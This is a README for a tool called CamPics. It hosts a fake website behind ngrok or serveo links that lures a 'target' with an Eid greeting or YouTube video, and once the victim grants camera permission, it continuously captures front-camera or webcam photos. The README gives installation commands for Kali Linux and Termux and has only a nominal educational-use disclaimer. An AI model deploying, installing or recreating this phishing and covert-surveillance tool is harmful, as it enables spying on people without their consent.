# CamPics
CamPics take shots from target's phone front camera or PC webcam just sending a link.

# How it works?
<p>CamPics is process to grab camera shots of target's phone front camera or PC webcam. You can trape target wishing EID or Youtube Video. CamPics repository Hosts a fake website using ngrok & serveo server to generate a link. You need to forward the link to the target. After sending the link victim will asked for camera permission and if the target allows it, this tool will grab front camera shots continuously of targeted device.</p>

# Legal disclaimer:
<p>Usage of CamPics for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.</p>

## This Tool Tested On :
<ul>
  <li>Kali Linux</li>
  <li>Termux</li>
  <li>Perrot Sec OS</li>
</ul>

# Installing and requirements
<p>This tool requires PHP for webserver, SSH or serveo link. First run following command on your terminal</p>

```
apt-get -y install php openssh git wget
```

## Installing (Kali Linux):

```
git clone https://github.com/TechBite-BD/CamPics
cd CamPics
bash campics.sh
```


## Installing (Termux):

```
pkg install git
pkg install wget
pkg install php 
pkg install openssh
git clone https://github.com/TechBite-BD/CamPics.git
cd CamPics
bash campics.sh
```
Note: Use Mobile Data For Ngrok Link

## Give me the credits if you copy ANY part from this code. Don't be NOOB!!

<p>CamPics is inspired from Anil Parashar</p>
